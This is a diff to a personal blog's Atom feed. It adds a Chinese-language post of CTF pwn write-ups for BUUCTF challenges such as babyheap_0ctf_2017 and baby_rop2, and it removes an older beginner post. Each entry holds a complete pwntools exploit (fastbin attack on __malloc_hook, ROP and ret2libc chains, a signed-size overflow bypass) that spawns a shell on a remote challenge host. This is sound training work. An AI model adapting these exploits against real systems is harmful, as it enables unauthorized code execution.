@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>柠檬的博客</title>
-    <updated>2020-07-11T14:42:24.216Z</updated>
+    <updated>2020-07-21T01:59:06.355Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -10,6 +10,313 @@
     <logo>https://zhangzy999.github.io/images/avatar.png</logo>
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 柠檬的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[buuctf：pwn刷题记录（二）]]></title>
+        <id>https://zhangzy999.github.io/post/buuctfpwn-shua-ti-ji-lu-er/</id>
+        <link href="https://zhangzy999.github.io/post/buuctfpwn-shua-ti-ji-lu-er/">
+        </link>
+        <updated>2020-07-18T01:07:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="babyheap_0ctf_2017">babyheap_0ctf_2017</h2>
+<p>fastbin attack<br>
+几个点：<br>
+1，read函数返回值为读取到的字节数<br>
+2，calloc分配后会将堆块中的数据全部置空<br>
+3，unsorted bin中的fd和bk（前提只有一个chunk）都会指向unsorted bin ，即arena + 88的位置，是个用来泄露libc地址的不错的选择，libc = unsorted_bin_addr - 88 - main_arena_offset，main_arena_offset用小工具来计算，不同libc版本不一样<br>
+4，got不可写时，我们通常攻击__malloc_hook函数，fake chunk的位置位于__malloc_hook - 0x23的位置，经验之谈：fake_chunk = libc_base + 0x3c4aed，当然也可以慢慢调试计算<br>
+5，在__malloc_hook附近分配chunk时，需要计算其size，0x7f &gt;&gt; 4 - 2 = 5，其mem_size为0x60<br>
+6，fastbin attack 常来攻击__malloc_hook函数</p>
+<p>漏洞位于fill函数中，我们填充数据时的字节由我们来控制，所以造成了任意堆溢出的情景。<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+
+#p = process('./babyheap_0ctf_2017')
+p = remote('node3.buuoj.cn',29704)
+
+elf = ELF('./babyheap_0ctf_2017')
+libc = ELF('./libc.so.6')
+#context.log_level = 'debug'
+
+def allocate(size):
+	p.recvuntil('Command: ')
+	p.sendline('1')
+	p.recvuntil('Size: ')
+	p.sendline(str(size))
+
+def fill(idx,size,content):
+	p.recvuntil('Command: ')
+	p.sendline('2')
+	p.recvuntil('Index: ')
+	p.sendline(str(idx))
+	p.recvuntil('Size: ')
+	p.sendline(str(size))
+	p.recvuntil('Content: ')
+	p.sendline(content)
+
+def free(idx):
+	p.recvuntil('Command: ')
+	p.sendline('3')
+	p.recvuntil('Index: ')
+	p.sendline(str(idx))
+
+def dump(idx):
+	p.recvuntil('Command: ')
+	p.sendline('4')
+	p.recvuntil('Index: ')
+	p.sendline(str(idx))
+	#p.recvuntil('Content:\n')
+
+
+print '==================step 1: leak libc address ================='
+allocate(0x10)  #idx 0
+allocate(0x90)	#idx 1
+allocate(0x90)	#idx 2
+allocate(0x10)	#idx 3
+#calloc 4 chunks,first to overflow ,second to mom ,third to child,last to protect not to hebing
+
+#To 
+free(1)
+payload = 0x10 * 'A' + p64(0) + p64(0x141)
+fill(0,len(payload),payload)
+allocate(0x130)
+
+payload = 0x90 * 'A' + p64(0) + p64(0xa1)
+fill(1,len(payload),payload)
+free(2)
+
+dump(1)   #dump mom to leak child fd_pointer
+p.recvuntil('Content: \n')
+p.recv(0x90 + 0x10)
+unsort_addr = u64(p.recv(0x8))
+print 'unsort_addr---------------&gt;:' + hex(unsort_addr)
+main_arena_offset = 0x3c4b20
+# 3c4b78
+libc_base = unsort_addr - 88 - main_arena_offset
+#we use a tool to caculate main_arena_offset addr
+print 'libc_addr-----------------&gt;:' + hex(libc_base)
+
+print '==========================step 2: one_gadget to get shell ===================='
+one_gadget_addr = libc_base + 0x4526a
+malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
+allocate(0x90)  #clean idx 2
+allocate(0x10)  #idx 4
+allocate(0x60)  #fastbin attack: idx 5
+allocate(0x10)  #to protect not to hebing: idx 6
+
+free(5)
+payload = 0x10 * 'A' + p64(0) + p64(0x71) + p64(malloc_hook_addr - 0x23)
+# fake_chunk_addr = libc_base + 0x3c4aed
+fill(4,len(payload),payload)
+
+allocate(0x60)  #idx 5
+allocate(0x60)  #idx 7
+payload = 0x13 * 'A' + p64(one_gadget_addr) 
+fill(7,len(payload),payload)
+
+allocate(0x10)
+p.interactive()
+</code></pre>
+<h2 id="ciscn_2019_s_3">ciscn_2019_s_3</h2>
+<p>好像有重题，找了一下现有的exp，还真能打通=.=<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+ 
+#p = process('./ciscn_s_3')
+p = remote('node3.buuoj.cn',29654)
+elf = ELF('./ciscn_s_3')
+context.log_level = 'debug'
+ 
+main_addr = elf.symbols['main']
+csu_end = 0x040059A
+csu_front = 0x0400580
+ret_addr = 0x004003a9
+rax_59_ret = 0x04004E2
+syscall = 0x0400517
+
+#gdb.attach(p,'b *0x00400589')
+payload = '/bin/sh\x00' + 'A'*0x8 + p64(main_addr)
+p.sendline(payload)
+p.recv(0x20)
+stack_addr = u64(p.recv(8))
+print 'stack_addr--&gt;' + hex(stack_addr)
+
+binsh_addr = stack_addr - 0x138
+rax_59 = binsh_addr + 0x10
+pop_rdi = 0x04005a3
+
+payload = '/bin/sh\x00' + 'A'*0x8 + p64(rax_59_ret) + p64(csu_end)
+payload += p64(0) + p64(1) + p64(rax_59) + p64(0) + p64(0) + p64(0)
+payload += p64(csu_front)
+payload += 'a'*0x38
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(syscall)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="jarvisoj_level2_x64">jarvisoj_level2_x64</h2>
+<p>简单的rop<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+
+r = remote('node3.buuoj.cn',26800)
+context.log_level = 'debug'
+
+system_addr = 0x4004C0
+offset = 0x88
+pop_rdi_ret_addr = 0x4006b3
+binsh_addr = 0x600A90
+payload = offset * 'a'  + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<h2 id="harekazectf2019baby_rop2">[HarekazeCTF2019]baby_rop2</h2>
+<p>栈溢出，rop没跑了，除了printf无输出函数，只能用printf来做，泄露read地址和__libc_start_main的地址都可，试试__libc_start_main吧<br>
+get到了几个新姿势：<br>
+1，__libc_start_main前面是俩下划线<br>
+2，printf(&quot;aaaaaa %s&quot;,char);  中，%s会被放到rdi，char会被放到rsi<br>
+3，printf经过构造也能用来泄露__libc_start_main的got地址（一般是write或者puts）<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+
+r = remote('node3.buuoj.cn',25712)
+elf = ELF('./babyrop2')
+#context.log_level = 'debug'
+
+printf_plt = elf.plt['printf']
+main = elf.symbols['main']
+libc_start_main_got = elf.got['__libc_start_main']
+offset = 0x28
+fmt_str = 0x400770 #func printf: %s is in rdi,string is in rsi
+pop_rdi_ret_addr = 0x400733
+pop_rsi_r15_ret_addr = 0x400731
+
+payload = offset * 'A' + p64(pop_rdi_ret_addr) + p64(fmt_str) + p64(pop_rsi_r15_ret_addr) + p64(libc_start_main_got) + p64(0) + p64(printf_plt) + p64(main)
+
+r.recvuntil('What\'s your name? ')
+r.sendline(payload)
+__libc_start_main_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+print '__libc_start_main==========================&gt;' + hex(__libc_start_main_addr)
+
+libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)
+libc_base = __libc_start_main_addr - libc.dump('__libc_start_main')
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+payload = offset * 'A' + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
+
+r.sendline(payload)
+r.interactive()
+</code></pre>
+<h2 id="ciscn_2019_ne_5">ciscn_2019_ne_5</h2>
+<p>输入密码进入菜单选项，乍以为是堆题，实际是栈溢出<br>
+新姿势get：system('sh')一样可以拿shell<br>
+ROPgadget --binary xxx --string 'sh' 可以找到字符串'sh'，然后就没有然后了<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+
+r = remote('node3.buuoj.cn',25224)
+elf = ELF('./ciscn_2019_ne_5')
+
+binsh_addr = 0x080482ea
+offset = 0x48 + 0x4
+system_addr = 0x080484D0
+payload = offset * 'A' + p32(system_addr) * 2 + p32(binsh_addr)
+
+r.recvuntil('Please input admin password:')
+r.sendline('administrator')
+r.recvuntil(':')
+r.sendline('1')
+r.recvuntil('Please input new log info:')
+r.sendline(payload)
+r.recvuntil(':')
+r.sendline('4')
+
+r.interactive()
+</code></pre>
+<h2 id="pwn2_sctf_2016">pwn2_sctf_2016</h2>
+<p>一开始泄露__libc_start_main，死活出不来<br>
+看了wp，改成了泄露printf，一下就出来了<br>
+我还能说什么，环境太坑了？？？<br>
+漏洞：没有检测size是否小于0，get_n函数的第一个参数作为无符号整数传入，但是在main函数却是整数，可以传入-1进行溢出，在get_n函数里面是个很大的数，在main函数里却是-1，得以绕过长度限制，进行栈溢出<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import LibcSearcher
+
+r = remote('node3.buuoj.cn',26971)
+elf = ELF('./pwn2_sctf_2016')
+
+fmt_str = 0x080486F8
+printf_plt = elf.plt['printf']
+printf_got = elf.got['printf']
+main_addr = elf.symbols['main']
+offset = 0x2c + 0x4
+
+payload = offset * 'A' + p32(printf_plt) + p32(main_addr) + p32(fmt_str)  +  p32(printf_got)
+
+r.recvuntil('How many bytes do you want me to read? ')
+r.sendline('-1')
+r.recvuntil('data!\n')
+r.sendline(payload)
+
+r.recvuntil('You said: ')
+r.recvuntil('You said: ')
+printf_addr = u32(r.recv(4))
+
+print 'printf_addr ===============================&gt; ' + hex(printf_addr)
+
+libc = LibcSearcher('printf',printf_addr)
+libc_base = printf_addr - libc.dump('printf')
+print 'libc_base ===============================&gt; ' + hex(libc_base)
+
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+print hex(system_addr)
+
+payload = offset * 'A' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
+
+r.recvuntil('How many bytes do you want me to read? ')
+r.sendline('-1')
+r.recvuntil('data!\n')
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+<h2 id="铁人三项第五赛区_2018_rop">铁人三项(第五赛区)_2018_rop</h2>
+<p>妹啥好说的，32位rop，用write函数泄露write地址，算算偏移直接拿flag<br>
+exp：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import LibcSearcher
+
+r = remote('node3.buuoj.cn',27250)
+elf = ELF('./2018_rop')
+#context.log_level = 'debug'
+
+offset = 0x88 + 0x4
+main_addr = elf.symbols['main']
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+
+payload = offset * 'A' + p32(write_plt) + p32(main_addr)  + p32(1) + p32(write_got) + p32(0x4)
+r.sendline(payload)
+
+write_addr = u32(r.recv(4))
+print 'write_addr =====================&gt; ' + hex(write_addr)
+
+libc = LibcSearcher('write',write_addr)
+libc_base = write_addr - libc.dump('write')
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+payload = offset * 'A' + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[fastbin attack(house of sprit) - 2014 hack.lu oreo]]></title>
         <id>https://zhangzy999.github.io/post/fastbin-attackhouse-of-sprit-2014-hacklu-oreo/</id>
@@ -810,40 +1117,6 @@ Google + 百度识图 基本能出来所有的答案<br>
 <h2 id="bincat">/bin/cat</h2>
 <p>拿到gif  逐帧提取  然后分离下色道 能看出来是二维码<br>
 不会写脚本 直接截图工具手撸  扫描得二维码</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[解决的第一个pwn题目—攻防世界新手区：when_did_you_born]]></title>
-        <id>https://zhangzy999.github.io/post/pwn_adworld_birth/</id>
-        <link href="https://zhangzy999.github.io/post/pwn_adworld_birth/">
-        </link>
-        <updated>2020-05-27T01:50:48.000Z</updated>
-        <content type="html"><![CDATA[<p>开始pwn了，成为pwn手是我毕生的梦想（🙏<br>
-我们简单运行了一下程序，发现就是一个很简单的输入生日和名字的功能<br>
-我们拿到ida里面简单看一波伪代码<br>
-可以看到v5是不能输入1926，但是要想拿到flag还得是1926，二者冲突了<br>
-<img src="https://zhangzy999.github.io//post-images/1590544386227.png" alt="" loading="lazy"><br>
-然后发现前面还有一个v4，并且是危险函数gets，我们可以考虑通过v4覆盖v5的值，让v5的值变成1926从而绕过前面的if判断<br>
-<img src="https://zhangzy999.github.io//post-images/1590544537541.png" alt="" loading="lazy"><br>
-总结思路：首先随便输入一个v5，绕过第一个if判断，然后输入v4，通过v4溢出来覆盖v5，从而达到我们的目的，让程序本身去cat flag，我们也不用搞栈溢出啥的，只是一个单纯的“变量溢出”<br>
-直接写个exp打过去就行</p>
-<pre><code class="language-python">from pwn import *
-p = remote(&quot;124.126.19.106&quot;,&quot;47436&quot;)
-
-offset = 8  #偏移量是8
-
-p.recvuntil(&quot;Birth?&quot;) #这个是到第一个if判断停下来
-p.sendline(&quot;hhh&quot;) #我们随便打个东西进去就行
-
-p.recvuntil(&quot;Name?&quot;)
-birth = 0x786      #0x786 == 1926
-payload = &quot;A&quot;*offset + p64(birth)
-
-p.sendline(payload)
-p.interactive()
-</code></pre>
-<p>然后就拿到了flag<br>
-<img src="https://zhangzy999.github.io//post-images/1590546253003.PNG" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
 </feed>
